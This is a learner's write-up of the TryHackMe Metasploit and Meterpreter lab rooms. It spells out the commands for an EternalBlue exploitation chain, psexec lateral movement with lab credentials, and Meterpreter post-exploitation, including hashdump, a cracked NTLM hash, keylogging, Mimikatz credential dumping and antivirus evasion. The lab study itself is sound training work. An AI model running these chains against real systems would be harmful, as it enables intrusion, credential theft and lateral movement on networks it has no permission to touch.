# Metasploit — The Arsenal

**Date:** 10.04.2026
**Platform:** TryHackMe
**Rooms:** Metasploit: Introduction + Meterpreter
**Difficulty:** Medium
**Status:** Both rooms completed

## The Creature

One interface. Thousands of weapons.
Choose the target. Choose the weapon.
Four commands. Full access.
The barrier to exploitation
dropped to near zero.

## Core Concepts

### The Three Pillars
Vulnerability → design/coding flaw in target system
Exploit       → code that uses the vulnerability
Payload       → what happens after access is gained

Without an exploit: you can't get in.
Without a payload: getting in means nothing.
Both are required. Each has one job.

### Module Categories
Exploits    → use vulnerabilities to gain access
Payloads    → execute on target after exploitation
Auxiliary   → scanners, fuzzers, brute force
Post        → actions after access (post-exploitation)
Encoders    → evade signature-based antivirus
Evasion     → more sophisticated AV bypass
NOPs        → buffer padding for payload consistency

### Payload Types
Singles  → self-contained, one file, runs immediately
Stagers  → small initial payload, downloads the rest
Stages   → downloaded by stager, larger functionality

How to identify:
generic/shell_reverse_tcp      ← inline (single) → underscore
windows/x64/shell/reverse_tcp  ← staged → slash between shell/reverse

## Essential Commands

### Navigation
msfconsole              → launch Metasploit
search ms17-010         → find relevant modules
search type:auxiliary telnet → filter by type
use exploit/windows/smb/ms17_010_eternalblue → select module
use 0                   → select by number from search results
back                    → leave current context
info                    → detailed module information
history                 → command history

### Configuration
show options            → list required parameters
set RHOSTS 10.10.x.x   → set target IP
set LHOST 10.10.x.x    → set attacker IP
set LPORT 4444         → set listener port
setg RHOSTS 10.10.x.x  → set globally (persists across modules)
unset PAYLOAD          → clear a parameter
unset all              → clear all parameters

### Execution
exploit                → run the exploit
run                    → alias for exploit
exploit -z             → run and background session immediately
check                  → check if target is vulnerable (no exploit)
sessions               → list active sessions
sessions -i 2          → interact with session 2
background             → background current session (CTRL+Z)

## EternalBlue (MS17-010) — The Exploit

CVE: CVE-2017-0144
Disclosed: 2017-03-14
Origin: NSA exploit leaked by Shadow Brokers
Used in: WannaCry ransomware (May 2017)

Vulnerability: Buffer overflow in SMBv1
Affected: Windows 7, Server 2008 R2 (x64)

Attack chain:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [target IP]
set LHOST [attacker IP]
exploit
→ Meterpreter session opened
→ NT AUTHORITY\SYSTEM

EternalBlue = initial access from zero.
You need only the target IP.
No credentials. No prior access.
One vulnerability = full system.

## psexec — Lateral Movement

use exploit/windows/smb/psexec
set RHOSTS [target IP]
set SMBUser ballen
set SMBPass Password1
exploit

psexec ≠ EternalBlue.
EternalBlue exploits a vulnerability.
psexec uses stolen credentials to move laterally.
This is post-exploitation — you already have creds,
now you use them to access other systems.

Credentials: ballen / Password1
→ Meterpreter session on ACME-TEST

## Meterpreter — The Ghost in the Machine

### Why Meterpreter is Dangerous

Runs in RAM — no file written to disk.
Antivirus scans files → no file = no detection.
Disguises itself as legitimate process (spoolsv.exe).
Encrypts all communication via TLS.
IDS/IPS cannot inspect encrypted traffic.
Invisible to standard detection methods.

This is why it's the preferred payload
for professional penetration testers.

### Post-Exploitation Commands Used

sysinfo
→ Computer: ACME-TEST
→ Domain: FLASH

getuid
→ NT AUTHORITY\SYSTEM (already root)

ps
→ listed all running processes
→ identified PIDs for migration

hashdump
→ dumped SAM database (Windows password store)
→ found NTLM hash for jchambers:
   69596c7aa1e8daee17f8e78870e25a5c

Cracked hash → cleartext: Trustno1
(crackstation.net or John the Ripper)

net share
→ found share created by user: speedster

search -f secrets.txt
→ c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
→ contained Twitter password: KDSvbsw3849!

search -f realsecret.txt
→ c:\inetpub\wwwroot\realsecret.txt
→ "The Flash is the fastest man alive"

shell
→ dropped into Windows command prompt
→ full command execution on target

### Key Meterpreter Commands Reference

getuid          → current user/privilege level
sysinfo         → system information
ps              → list running processes
migrate [PID]   → move to another process
hashdump        → dump Windows password hashes
search -f [file] → find files on system
download [file] → download file to attacker
upload [file]   → upload file to target
shell           → drop into system shell
screenshot      → capture desktop screenshot
keyscan_start   → begin keylogging
keyscan_dump    → retrieve captured keystrokes
getsystem       → attempt privilege escalation
load kiwi       → load Mimikatz (credential dumping)
background      → background current session

### Load Kiwi (Mimikatz)
load kiwi
creds_all       → dump all credentials
lsa_dump_sam    → dump SAM database
wifi_list       → steal saved WiFi passwords

## Full Attack Chain (Both Rooms)

Phase 1 — Initial Access (EternalBlue):
nmap → discover open SMB port 445
search ms17-010 → find exploit
use ms17_010_eternalblue → load module
set RHOSTS + LHOST → configure
exploit → Meterpreter session opened
getuid → NT AUTHORITY\SYSTEM confirmed

Phase 2 — Post-Exploitation (Meterpreter):
sysinfo → map the target
hashdump → steal password hashes
crack hashes → recover cleartext passwords
search secrets → find sensitive files
read files → extract valuable information

Phase 3 — Lateral Movement (psexec):
use psexec → switch module
set credentials → use stolen passwords
exploit → access additional systems
expand foothold across the network

## What Surprised Me

Meterpreter hiding as spoolsv.exe (print spooler).
A completely legitimate Windows process.
Running our code. Undetected.

The secrets.txt contained real credentials.
Users store passwords in plaintext files.
On corporate systems. On servers.
Password managers exist. People don't use them.

psexec used valid credentials — not an exploit.
The system did exactly what it was designed to do.
Let authenticated users in.
We were authenticated. With stolen credentials.
The system had no idea.

## Open Questions

- How does Mimikatz extract plaintext passwords
  from Windows memory (lsass.exe)?
- What is Pass-the-Hash and how does it work?
  (use NTLM hash without cracking it)
- How do defenders detect Meterpreter?
  What logs does it leave behind?
- What is a Golden Ticket attack (Kiwi)?
- How does migrate to another process
  help maintain persistence?

## Tags
metasploit, meterpreter, eternalblue, ms17-010,
psexec, lateral-movement, post-exploitation,
hashdump, ntlm, kiwi, mimikatz, smb,
sessions, payload, exploit, tryhackme,
windows, privilege-escalation, credential-theft